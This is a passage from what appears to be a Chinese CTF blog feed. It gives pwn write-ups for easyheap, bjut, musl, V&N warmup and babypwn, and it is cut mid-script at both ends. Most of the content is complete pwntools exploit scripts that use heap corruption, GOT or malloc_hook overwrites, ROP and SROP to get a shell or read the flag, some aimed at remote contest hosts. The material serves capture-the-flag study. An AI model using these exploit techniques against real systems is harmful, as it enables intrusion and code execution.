add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    